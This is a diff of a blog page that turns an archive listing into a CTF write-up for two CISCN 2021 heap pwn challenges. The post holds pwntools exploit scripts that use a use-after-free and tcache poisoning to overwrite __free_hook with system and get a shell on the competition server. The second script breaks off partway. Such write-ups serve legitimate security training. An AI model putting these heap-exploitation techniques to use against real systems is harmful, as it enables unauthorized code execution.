@@ -43,7 +43,7 @@
     
     <title>
         
-            Archives | 
+            CISCN2021 初赛 | 
         
         Apr1L&#39;s blog
     </title>
@@ -54,7 +54,7 @@
 
     <meta name="format-detection" content="telephone=no">
     <meta name="description" itemprop="description" content>
-    <meta name="keywords" content>
+    <meta name="keywords" content=",pwn">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -81,6 +81,9 @@
         <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
 
         
+            
+                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?zp8STOU9v89XWFEnN+6YmQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/github-v2.min.css?AfzKxt++K+/lhZBlSjnxwg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
             
         
 
@@ -217,7 +220,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="Apr1L&#39;s blog">
-    <meta name="msapplication-starturl" content="http://suvii22.github.io/archives/page/2/">
+    <meta name="msapplication-starturl" content="http://suvii22.github.io/2021/05/24/CISCN2021-初赛/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="Apr1L&#39;s blog">
@@ -232,13 +235,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://suvii22.github.io/archives/page/2/">
+    <meta property="og:url" content="http://suvii22.github.io/2021/05/24/CISCN2021-初赛/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Archives | Apr1L&#39;s blog">
+    <meta property="og:title" content="CISCN2021 初赛 | Apr1L&#39;s blog">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content>
-    
+    <meta property="og:article:tag" content="pwn"> 
 
+    
+        <meta property="article:published_time" content="Mon May 24 2021 17:35:02 GMT+0800">
+        <meta property="article:modified_time" content="Mon May 24 2021 20:14:05 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -246,13 +252,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://suvii22.github.io/archives/page/2/index.html">
+        <link rel="canonical" href="http://suvii22.github.io/2021/05/24/CISCN2021-初赛/index.html">
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://suvii22.github.io/2021/05/24/CISCN2021-初赛/index.html",
+    "headline": "CISCN2021 初赛",
+    "datePublished": "Mon May 24 2021 17:35:02 GMT+0800",
+    "dateModified": "Mon May 24 2021 20:14:05 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "Apr1L",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/avatar.png"
+        },
+        "description": "Hi, nice to meet you"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "Apr1L&#39;s blog",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/favicon.png"
+        }
+    },
+    "keywords": ",pwn",
+    "description": "",
+}
+</script>
 
 
     
@@ -286,592 +322,373 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#channel"><span class="post-toc-number">1.</span> <span class="post-toc-text">channel</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lonelywolf"><span class="post-toc-number">2.</span> <span class="post-toc-text">lonelywolf</span></a></li></ol>
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2020/05/13/csaw2016-hungman/">csaw2016_hungman</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            分析这个程序一开始...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2020/05/13/csaw2016-hungman/" target="_self">Read more</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
-            </div>
-            <div>
-                <strong>Apr1L</strong>
-                <span>May 13, 2020</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/pwn/">pwn</a>, <a class="post_category-link" href="/categories/pwn/wp/">wp</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2020/03/27/no-show-to-leak/">no show to leak</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            这个 leak 方法是从高校战“疫”网络安全分享赛 woodenbox 这道题中学会的，这道题我是用 Hous...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2020/03/27/no-show-to-leak/" target="_self">Read more</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
-            </div>
-            <div>
-                <strong>Apr1L</strong>
-                <span>Mar 27, 2020</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/pwn/">pwn</a>, <a class="post_category-link" href="/categories/pwn/笔记/">笔记</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2020/03/26/House-of-orange/">House of orange</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2020/03/26/House-of-orange/" target="_self">Read more</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
-            </div>
-            <div>
-                <strong>Apr1L</strong>
-                <span>Mar 26, 2020</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/pwn/">pwn</a>, <a class="post_category-link" href="/categories/pwn/笔记/">笔记</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2020/02/28/SUCTF2019-playfmt/">SUCTF2019 playfmt</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            分析首先看一下输入...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2020/02/28/SUCTF2019-playfmt/" target="_self">Read more</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
-            </div>
-            <div>
-                <strong>Apr1L</strong>
-                <span>Feb 28, 2020</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/pwn/">pwn</a>, <a class="post_category-link" href="/categories/pwn/wp/">wp</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2019/11/24/BUUCTF/">BUUCTF</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2019/11/24/BUUCTF/" target="_self">Read more</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
-            </div>
-            <div>
-                <strong>Apr1L</strong>
-                <span>Nov 24, 2019</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/pwn/">pwn</a>, <a class="post_category-link" href="/categories/pwn/wp/">wp</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2019/11/04/Syc-Geek-10th/">Syc Geek 10th</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2019/11/04/Syc-Geek-10th/" target="_self">Read more</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
-            </div>
-            <div>
-                <strong>Apr1L</strong>
-                <span>Nov 04, 2019</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/pwn/">pwn</a>, <a class="post_category-link" href="/categories/pwn/wp/">wp</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2019/10/29/Ubuntu关闭ASLR/">Ubuntu关闭ASLR</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            确认ASLR是否已经被打开，“2”表示已经打开
-suv11@ubuntu:~$ cat /proc/sys/kerne...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2019/10/29/Ubuntu关闭ASLR/" target="_self">Read more</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
-            </div>
-            <div>
-                <strong>Apr1L</strong>
-                <span>Oct 29, 2019</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/Linux/">Linux</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2019/10/27/wiki/">wiki</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2019/10/27/wiki/" target="_self">Read more</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
-            </div>
-            <div>
-                <strong>Apr1L</strong>
-                <span>Oct 27, 2019</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/pwn/">pwn</a>, <a class="post_category-link" href="/categories/pwn/wp/">wp</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2019/10/08/攻防世界/">攻防世界</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            pwn1
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2019/10/08/攻防世界/" target="_self">Read more</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
-            </div>
-            <div>
-                <strong>Apr1L</strong>
-                <span>Oct 08, 2019</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/pwn/">pwn</a>, <a class="post_category-link" href="/categories/pwn/wp/">wp</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-    <!-- Index nav -->
-        <nav class="material-nav mdl-cell mdl-cell--12-col">
-            <a class="extend prev" rel="prev" href="/archives/"><button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"><i class="material-icons" role="presentation">arrow_back</i></button></a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span>
-        </nav>
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                CISCN2021 初赛
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>Apr1L</strong>
+        <span>May 24, 2021</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/pwn/">pwn</a>
+    </ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=CISCN2021 初赛&url=http://suvii22.github.io/2021/05/24/CISCN2021-初赛/index.html&pic=http://suvii22.github.io/img/favicon.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                Share to Weibo
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=CISCN2021 初赛&url=http://suvii22.github.io/2021/05/24/CISCN2021-初赛/index.html&via=Apr1L" target="_blank">
+            <li class="mdl-menu__item">
+                Share to Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://suvii22.github.io/2021/05/24/CISCN2021-初赛/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                Share to Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://suvii22.github.io/2021/05/24/CISCN2021-初赛/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                Share to Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
     
 </div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>记录一下我做的两道题</p>
+<h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><p>glibc2.31，aarch64架构的堆题。程序维护了一个单向链表，在偏移+0x100处为next指针，+0x108处为维护content结构的指针；链表删除节点的时候只是free(node)，存在UAF，于是可以通过House of botcake，来修改tcache中chunk的fd为free_hook，覆盖free_hook为system来get shell。</p>
+<pre><code class="python">from pwn import *
+
+context.log_level = &#39;debug&#39;
+debug = 0
+local = 0
+if local:
+    if debug:
+        p = process([&#39;./qemu-aarch64-static&#39;,&#39;-L&#39;,&#39;/usr/aarch64-linux-gnu&#39;,&#39;-g&#39;,&#39;1234&#39;,&#39;channel&#39;])
+    else:
+        p = process([&#39;./qemu-aarch64-static&#39;,&#39;-L&#39;,&#39;/usr/aarch64-linux-gnu&#39;,&#39;channel&#39;])
+else:
+    p = remote(&#39;124.71.235.54&#39;,&#39;24992&#39;)
+
+#libc = ELF(&#39;/usr/aarch64-linux-gnu/lib/libc-2.31.so&#39;)
+libc = ELF(&#39;./libc-2.31.so&#39;)
+def Register(key):
+    p.sendlineafter(&#39;&gt; &#39;,str(1))
+    p.sendafter(&#39;key&gt; &#39;,key)
+def UnRegister(key):
+    p.sendlineafter(&#39;&gt; &#39;,str(2))
+    p.sendafter(&#39;key&gt; &#39;,key)
+def Read(key):
+    p.sendlineafter(&#39;&gt; &#39;,str(3))
+    p.sendafter(&#39;key&gt; &#39;,key)
+def Write(key,len,con):
+    p.sendlineafter(&#39;&gt; &#39;,str(4))
+    p.sendafter(&#39;key&gt; &#39;,key)
+    p.sendafter(&#39;len&gt; &#39;,str(len))
+    p.sendafter(&#39;content&gt; &#39;,con)
+
+
+for i in range(22):
+    Register(&#39;A&#39;*(i+1))
+for i in range(7):
+    UnRegister(&#39;A&#39;*(i+1))
+UnRegister(&#39;A&#39;*(21))
+Write(&#39;A&#39;*22,0x10,&#39;A&#39;*0x8) 
+Read(&#39;A&#39;*22) # b *(0x4000000000+0x11B0)
+#0x400085e000
+off = 0x16dbd0
+p.recvuntil(&#39;AAAAAAAA&#39;)
+libc_base = (u64(p.recv(3).ljust(8,b&#39;\x00&#39;))|0x4000000000)-off
+tmp = libc_base + off
+p.info(&#39;tmp: &#39;+hex(tmp))
+p.info(&#39;libc_base: &#39;+hex(libc_base))
+Write(&#39;A&#39;*22,0xA0,&#39;A&#39;*0x8)  #b *(0x4000000000+0x134C)
+UnRegister(&#39;A&#39;*9) #victim 0x40009d2fa0
+UnRegister(&#39;A&#39;*8) #0x40009d2d60=&#39;A&#39;*0x7
+Register(&#39;/bin/sh\x00&#39;)
+#Read(&#39;A&#39;*0x8)
+fake = libc_base + 0x16dac0
+UnRegister(p64(fake)*2)
+free_hook  = libc_base + libc.sym[&#39;__free_hook&#39;]
+malloc_hook  = libc.sym[&#39;__malloc_hook&#39;]
+puts = libc_base + libc.sym[&#39;puts&#39;]
+p.info(&#39;puts: &#39;+hex(puts))
+system = libc_base + libc.sym[&#39;system&#39;]
+payload = b&#39;C&#39;*0x110+p64(0)+p64(0x121)+p64(free_hook)
+Write(&#39;A&#39;*12,0x150,payload)  #b *(0x4000000000+0x134C)
+#0x00000040009cbac0 0x00000040009cbac0
+Register(&#39;A&#39;)
+#Read(&#39;A&#39;*0x8)
+Register(p64(system))
+#Read(&#39;A&#39;*0x8)
+UnRegister(&#39;/bin/sh\x00&#39;)
+#Read(&#39;A&#39;*0x8) #b *(0x4000000000+0x1410)
+#p.info(&#39;malloc_hook: &#39;+hex(malloc_hook))
+
+p.interactive()</code></pre>
+<h2 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h2><pre><code class="python">from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+
+#p = process(&#39;./lonelywolf&#39;)
+p = remote(&#39;124.71.235.54&#39;,&#39;25033&#39;)
+elf = ELF(&#39;./lonelywolf&#39;)
+#libc = elf.libc
+libc = ELF(&#39;./libc-2.27.so&#39;)
+
+def add(idx,size):
+    p.sendlineafter(&#39;Your choice: &#39;,str(1))
+    p.sendlineafter(&#39;Index: &#39;,str(idx))
+    p.sendlineafter(&#39;Size: &#39;,str(size))
+
+def edit(idx,con):
+    p.sendlineafter(&#39;Your choice: &#39;,str(2))
+    p.sendlineafter(&#39;Index: &#39;,str(idx))
+    p.sendlineafter(&#39;Content: &#39;,con)
+
+def show(idx):
+    p.sendlineafter(&#39;Your choice: &#39;,str(3))
+    p.sendlineafter(&#39;Index: &#39;,str(idx))
+
+def dele(idx):
+    p.sendlineafter(&#39;Your choice: &#39;,str(4))
+    p.sendlineafter(&#39;Index: &#39;,str(idx))
+
+#size_list = 0x555555554000+0x202050
+#heap = 0x555555554000+0x202058
+
+add(0,0x78)
+edit(0,p64(0)+p64(0x501))
+for i in range(10):
+    add(0,0x78)
+edit(0,p64(0)+p64(0x71))
+add(0,0x78) #0
+dele(0)
+edit(0,&#39;\x00&#39;*0x10)
+dele(0)
+show(0)
+p.recvuntil(&#39;Content: &#39;)
+heap = u64(p.recv(6)+&#39;\x00\x00&#39;)
+p.info(&#39;heap: &#39;+hex(heap))
+
+fake = heap-0x570
+edit(0,p64(fake))
+add(0,0x78)
+add(0,0x78)
+
+dele(0)
+show(0)
+
+p.recvuntil(&#39;Content: &#39;)
+libc_base = u64(p.recv(6)+&#39;\x00\x00&#39;)-0x3ebca0
+p.info(&#39;libc_base: &#39;+hex(libc_base))
+add(0,0x30)
+dele(0)
+edit(0,&#39;\x00&#39;*0x10)
+dele(0)
+malloc_hook = libc_base + libc.sym[&#39;__malloc_hook&#39;]
+free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
+system = libc_base + libc.sym[&#39;system&#39;]
+one = [0x4f365,0x4f3c2,0x10a45c]
+edit(0,p64(free_hook-0x8))
+#edit(0,p64(malloc_hook))
+add(0,0x30)
+add(0,0x30)
